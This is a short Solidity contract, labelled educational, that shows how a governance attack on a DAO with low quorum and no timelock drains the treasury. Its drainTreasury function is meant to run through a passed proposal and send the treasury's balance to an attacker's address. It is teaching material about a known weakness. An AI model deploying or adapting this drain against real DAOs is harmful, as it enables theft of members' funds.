// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// EDUCATIONAL: Demonstrates governance attack via low quorum + no timelock
contract GovernanceAttacker {
    address public owner;
    bool public executed;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    // Malicious function to be called via governance proposal
    function drainTreasury(address treasury, address to) external {
        executed = true;
        (bool ok,) = to.call{value: address(treasury).balance}("");
        require(ok, "Drain failed");
    }

    receive() external payable {}
}
